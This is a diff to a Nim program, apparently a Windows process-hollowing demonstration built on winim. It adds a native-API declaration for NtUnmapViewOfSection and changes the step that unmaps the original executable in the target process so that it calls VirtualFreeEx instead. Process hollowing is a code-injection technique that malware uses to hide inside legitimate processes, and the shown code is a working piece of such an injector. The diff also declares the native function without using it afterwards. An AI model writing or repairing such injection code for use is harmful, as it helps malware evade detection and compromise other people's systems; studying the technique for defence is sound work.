@@ -1,6 +1,16 @@
 import winim/lean
+import winim/extra  # May contain additional API functions
 import strformat
 import strutils
+
+# Add declarations for the Native API functions we need
+type
+  NTSTATUS = int32
+
+proc NtUnmapViewOfSection(
+  ProcessHandle: HANDLE,
+  BaseAddress: PVOID
+): NTSTATUS {.stdcall, dynlib: "ntdll.dll", importc.}
 
 type
   # Structure to store section information from the PE headers
@@ -160,9 +170,11 @@ proc demonstrateProcessHollowing() =
   echo "5. Unmapping original executable from target process..."
   let sizeOfImage = ntHeaders.OptionalHeader.SizeOfImage
   
-  if not NtUnmapViewOfSection(
+  if VirtualFreeEx(
     pi.hProcess,
-    imageBaseAddr
+    imageBaseAddr,
+    0,
+    MEM_RELEASE
   ):
     echo "Successfully unmapped the original image"
   else:
